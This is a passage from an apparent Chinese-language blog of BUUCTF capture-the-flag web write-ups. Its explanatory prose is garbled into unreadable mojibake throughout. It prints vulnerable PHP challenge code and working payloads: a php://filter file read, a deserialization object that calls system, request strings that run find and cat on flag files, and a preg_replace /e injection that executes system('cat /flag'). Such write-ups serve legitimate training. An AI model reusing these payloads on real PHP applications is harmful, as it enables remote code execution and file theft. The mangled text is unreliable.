</span></span><span class="line"><span class="cl">				<span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="k">if</span><span class="p">(</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;woofers&#34;</span> <span class="p">)</span> <span class="o">!==</span>  <span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;meowers&#34;</span> <span class="p">)</span> <span class="o">!==</span>  <span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;index&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">						<span class="k">include</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">					<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">						<span class="k">echo</span> <span class="s2">&#34;Sorry, we currently only support woofers and meowers.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">category=woofers/../flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞ùËØïÁõÆÂΩïÁ©øË∂äÔºåÁõ¥Êé•ËØªÂèñ‰∏ç‰∫Üflag</p>
<p>ËøôÈáåÁî®Âà∞‰º™ÂçèËÆÆÂèØ‰ª•Â•ó‰∏ÄÂ±ÇÂçèËÆÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">category=php://filter/convert.base64-encode/index/resource=flag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÁΩëÈºéÊùØ-2020-Êú±ÈõÄÁªÑphpweb">[ÁΩëÈºéÊùØ 2020 Êú±ÈõÄÁªÑ]phpweb
</h2><p>ÁïåÈù¢‰∏ÄÁõ¥Âú®Ëá™Â∑±Âà∑Êñ∞Êàë‰ª¨ÊäìÂåÖÁúãÁúã</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209135751020.png"
	width="1430"
	height="560"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209135751020_hu8458753889793069696.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209135751020_hu12533771697984291941.png 1024w"
	loading="lazy"
	
		alt="image-20250209135751020"
	
	
		class="gallery-image" 
		data-flex-grow="255"
		data-flex-basis="612px"
	
></p>
<p>ÂèØËÉΩÊòØfuncÂèÇÊï∞‰∏∫ÂáΩÊï∞ÁÑ∂Âêép‰∏∫ÂáΩÊï∞ÂÄºÔºåÊàë‰ª¨ÂÖàÊü•Áúãindex.phpÔºåÁî®file_get_contents,highlight_file() Ôºåshow_source()ÈÉΩË°å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">   <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$disable_fun</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span><span class="s2">&#34;shell_exec&#34;</span><span class="p">,</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="s2">&#34;passthru&#34;</span><span class="p">,</span><span class="s2">&#34;proc_open&#34;</span><span class="p">,</span><span class="s2">&#34;show_source&#34;</span><span class="p">,</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">,</span><span class="s2">&#34;popen&#34;</span><span class="p">,</span><span class="s2">&#34;dl&#34;</span><span class="p">,</span><span class="s2">&#34;eval&#34;</span><span class="p">,</span><span class="s2">&#34;proc_terminate&#34;</span><span class="p">,</span><span class="s2">&#34;touch&#34;</span><span class="p">,</span><span class="s2">&#34;escapeshellcmd&#34;</span><span class="p">,</span><span class="s2">&#34;escapeshellarg&#34;</span><span class="p">,</span><span class="s2">&#34;assert&#34;</span><span class="p">,</span><span class="s2">&#34;substr_replace&#34;</span><span class="p">,</span><span class="s2">&#34;call_user_func_array&#34;</span><span class="p">,</span><span class="s2">&#34;call_user_func&#34;</span><span class="p">,</span><span class="s2">&#34;array_filter&#34;</span><span class="p">,</span> <span class="s2">&#34;array_walk&#34;</span><span class="p">,</span>  <span class="s2">&#34;array_map&#34;</span><span class="p">,</span><span class="s2">&#34;registregister_shutdown_function&#34;</span><span class="p">,</span><span class="s2">&#34;register_tick_function&#34;</span><span class="p">,</span><span class="s2">&#34;filter_var&#34;</span><span class="p">,</span> <span class="s2">&#34;filter_var_array&#34;</span><span class="p">,</span> <span class="s2">&#34;uasort&#34;</span><span class="p">,</span> <span class="s2">&#34;uksort&#34;</span><span class="p">,</span> <span class="s2">&#34;array_reduce&#34;</span><span class="p">,</span><span class="s2">&#34;array_walk&#34;</span><span class="p">,</span> <span class="s2">&#34;array_walk_recursive&#34;</span><span class="p">,</span><span class="s2">&#34;pcntl_exec&#34;</span><span class="p">,</span><span class="s2">&#34;fopen&#34;</span><span class="p">,</span><span class="s2">&#34;fwrite&#34;</span><span class="p">,</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">gettime</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span><span class="o">=</span> <span class="nx">gettype</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;Y-m-d h:i:s a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;date&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$func</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;func&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$p</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;p&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$func</span> <span class="o">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$func</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$func</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$disable_fun</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Hacker...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;Y-m-d h:i:s a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;date&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nx">gettime</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂèØ‰ª•Âà©Áî®ÂèçÂ∫èÂàóÂåñÔºåÊù•rceÔºåÂõ†‰∏∫gettimeÂáΩÊï∞Êú¨Ë¥®ÊòØcall_user_funcÂáΩÊï∞ÔºåÂèØ‰ª•rce</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$p</span> <span class="o">=</span> <span class="s2">&#34;ls&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">var</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">&#34;system&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂâçÈù¢func‰º†unserializeÂáΩÊï∞</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140545313.png"
	width="1825"
	height="641"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140545313_hu4300750241893974428.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140545313_hu7532352048684961123.png 1024w"
	loading="lazy"
	
		alt="image-20250209140545313"
	
	
		class="gallery-image" 
		data-flex-grow="284"
		data-flex-basis="683px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140753435.png"
	width="1766"
	height="686"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140753435_hu4100999084569372689.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140753435_hu6042760318160422444.png 1024w"
	loading="lazy"
	
		alt="image-20250209140753435"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>ÈÉΩÊ≤°ÊúâÊàë‰ª¨Áõ¥Êé•findÊü•Êâæ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140845510.png"
	width="1850"
	height="684"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140845510_hu165542964673131747.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140845510_hu16506465532507393306.png 1024w"
	loading="lazy"
	
		alt="image-20250209140845510"
	
	
		class="gallery-image" 
		data-flex-grow="270"
		data-flex-basis="649px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140929226.png"
	width="1860"
	height="710"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209140929226_hu1702676326642623232.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209140929226_hu14361113559852143113.png 1024w"
	loading="lazy"
	
		alt="image-20250209140929226"
	
	
		class="gallery-image" 
		data-flex-grow="261"
		data-flex-basis="628px"
	
></p>
<p>ÊàñËÄÖ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">func=readfile&amp;p=/tmp/flagoefiu4r93
</span></span><span class="line"><span class="cl">func=unserialize&amp;p=O:4:&#34;Test&#34;:2:{s:1:&#34;p&#34;;s:25:&#34;cat $(find / -name flag*)&#34;;s:4:&#34;func&#34;;s:6:&#34;system&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂ•ΩÂÉèËøòÊúâÈùûÈ¢ÑÊúü</p>
<p>\Âè∑ÂêéÈù¢ÁöÑÂëΩ‰ª§‰∏ç‰ºöË¢´ËØÜÂà´</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">func=\system&amp;p=find / -name flag*
</span></span><span class="line"><span class="cl">func=\system&amp;p=cat /tmp/flagoefiu4r93
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bjdctf2020the-mystery-of-ip">[BJDCTF2020]The mystery of ip
</h2><p>smartyÊ≥®ÂÖ•</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141534897.png"
	width="1874"
	height="723"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141534897_hu4731107344489191908.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209141534897_hu17280963412725723899.png 1024w"
	loading="lazy"
	
		alt="image-20250209141534897"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="622px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141639426.png"
	width="1866"
	height="783"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141639426_hu3441093512976670731.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209141639426_hu713522798428886108.png 1024w"
	loading="lazy"
	
		alt="image-20250209141639426"
	
	
		class="gallery-image" 
		data-flex-grow="238"
		data-flex-basis="571px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141659875.png"
	width="1879"
	height="765"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209141659875_hu14010037904397498542.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209141659875_hu13745862924186542974.png 1024w"
	loading="lazy"
	
		alt="image-20250209141659875"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="589px"
	
></p>
<h2 id="bjdctf2020zjctf‰∏çËøáÂ¶ÇÊ≠§">[BJDCTF2020]ZJCTFÔºå‰∏çËøáÂ¶ÇÊ≠§
</h2><p>ËØªÂèñnext.phpÂÜÖÂÆπ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209150818565.png"
	width="1839"
	height="637"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209150818565_hu15548471714424086413.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209150818565_hu12320866817449997658.png 1024w"
	loading="lazy"
	
		alt="image-20250209150818565"
	
	
		class="gallery-image" 
		data-flex-grow="288"
		data-flex-basis="692px"
	
></p>
<p>‰∏ãÈù¢post‰º†i have a dream</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;/(&#39;</span> <span class="o">.</span> <span class="nv">$re</span> <span class="o">.</span> <span class="s1">&#39;)/ei&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;strtolower(&#34;\\1&#34;)&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$str</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$re</span> <span class="o">=&gt;</span> <span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">complex</span><span class="p">(</span><span class="nv">$re</span><span class="p">,</span> <span class="nv">$str</span><span class="p">)</span><span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">	<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂèëÁé∞preg_replaceÁî®‰∫Ü/eÂèÇÊï∞ÔºåÊòØÂ≠òÂú®rceÊºèÊ¥ûÁöÑ</p>
<p>‰ΩÜÊòØËøôÈáåÁöÑÁ¨¨‰∫å‰∏™ÂèÇÊï∞Âõ∫ÂÆö‰∫ÜÔºåÊé•‰∏ãÊù•ÂºïÁî®ËøôÁØáÔºö<a class="link" href="https://xz.aliyun.com/news/2239"  target="_blank" rel="noopener"
    >ÊñáÁ´† - Ê∑±ÂÖ•Á†îÁ©∂preg_replace‰∏é‰ª£Á†ÅÊâßË°å - ÂÖàÁü•Á§æÂå∫</a></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154052460.png"
	width="1006"
	height="139"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154052460_hu18435738445340422217.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209154052460_hu1497090911151400531.png 1024w"
	loading="lazy"
	
		alt="image-20250209154052460"
	
	
		class="gallery-image" 
		data-flex-grow="723"
		data-flex-basis="1736px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154107040.png"
	width="964"
	height="93"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209154107040_hu1398163190922067408.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209154107040_hu1317513239394227358.png 1024w"
	loading="lazy"
	
		alt="image-20250209154107040"
	
	
		class="gallery-image" 
		data-flex-grow="1036"
		data-flex-basis="2487px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÂèçÂêëÂºïÁî®
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ÂØπ‰∏Ä‰∏™Ê≠£ÂàôË°®ËææÂºèÊ®°ÂºèÊàñÈÉ®ÂàÜÊ®°Âºè ‰∏§ËæπÊ∑ªÂä†ÂúÜÊã¨Âè∑ Â∞ÜÂØºËá¥Áõ∏ÂÖ≥ ÂåπÈÖçÂ≠òÂÇ®Âà∞‰∏Ä‰∏™‰∏¥Êó∂ÁºìÂÜ≤Âå∫ ‰∏≠ÔºåÊâÄÊçïËé∑ÁöÑÊØè‰∏™Â≠êÂåπÈÖçÈÉΩÊåâÁÖßÂú®Ê≠£ÂàôË°®ËææÂºèÊ®°Âºè‰∏≠‰ªéÂ∑¶Âà∞Âè≥Âá∫Áé∞ÁöÑÈ°∫Â∫èÂ≠òÂÇ®„ÄÇÁºìÂÜ≤Âå∫ÁºñÂè∑‰ªé 1 ÂºÄÂßãÔºåÊúÄÂ§öÂèØÂ≠òÂÇ® 99 ‰∏™ÊçïËé∑ÁöÑÂ≠êË°®ËææÂºè„ÄÇÊØè‰∏™ÁºìÂÜ≤Âå∫ÈÉΩÂèØ‰ª•‰ΩøÁî® &#39;\n&#39; ËÆøÈóÆÔºåÂÖ∂‰∏≠ n ‰∏∫‰∏Ä‰∏™Ê†áËØÜÁâπÂÆöÁºìÂÜ≤Âå∫ÁöÑ‰∏Ä‰ΩçÊàñ‰∏§‰ΩçÂçÅËøõÂà∂Êï∞„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâÄ‰ª•ËøôÈáåÁöÑ <strong>\1</strong> ÂÆûÈôÖ‰∏äÊåáÂÆöÁöÑÊòØÁ¨¨‰∏Ä‰∏™Â≠êÂåπÈÖçÈ°πÔºåÁÑ∂ÂêéÂéüÊù•Á¨¨‰∏â‰∏™ÂèÇÊï∞ËæìÂÖ•ÂëΩ‰ª§ÔºåÂ∞±‰ºöÂèòÊàêÁ¨¨‰∫å‰∏™ÔºåÂéüÊù•ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÂÜôÂÖ•Ê®°Á≥äÂåπÈÖç.*Â∞±‰ºöÂåπÈÖçÁé∞Âú®ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞\1ÔºåÁÑ∂ÂêéÂ∞±‰ºöËß¶Âèë/eÂèÇÊï∞ÊºèÊ¥û</p>
<p>‰ΩÜÊòØ<code>.*</code>Âú®phpÈáåÈù¢ÔºåÂØπ‰∫é‰º†ÂÖ•ÁöÑÈùûÊ≥ïÁöÑ $_GET Êï∞ÁªÑÂèÇÊï∞ÂêçÔºå‰ºöÂ∞ÜÂÖ∂ËΩ¨Êç¢Êàê‰∏ãÂàíÁ∫øÔºåÊàë‰ª¨Êîπ‰∏∫<code>S*</code></p>
<p>ÊúÄÁªàpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\S*=${getFlag()}&amp;cmd=system(&#39;ls /&#39;)
</span></span><span class="line"><span class="cl">\S*=${getFlag()}&amp;cmd=system(&#39;cat /flag&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁî®${}ÂåÖË£πÂáΩÊï∞ÔºåÊòØphpÂèØÂèòÂèòÈáèÁöÑÂéüÂõ†Ôºö<a class="link" href="https://www.php.net/manual/zh/language.variables.variable.php"  target="_blank" rel="noopener"
    >PHP: ÂèØÂèòÂèòÈáè - Manual</a></p>
<p>Âú®PHP‰∏≠ÂèåÂºïÂè∑ÂåÖË£πÁöÑÂ≠óÁ¨¶‰∏≤‰∏≠ÂèØ‰ª•Ëß£ÊûêÂèòÈáèÔºåËÄåÂçïÂºïÂè∑Âàô‰∏çË°å„ÄÇ <strong>${phpinfo()}</strong> ‰∏≠ÁöÑ <strong>phpinfo()</strong> ‰ºöË¢´ÂΩìÂÅöÂèòÈáèÂÖàÊâßË°åÔºåÊâßË°åÂêéÔºåÂç≥ÂèòÊàê <strong>${1}</strong> (phpinfo()ÊàêÂäüÊâßË°åËøîÂõûtrue)</p>
<h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
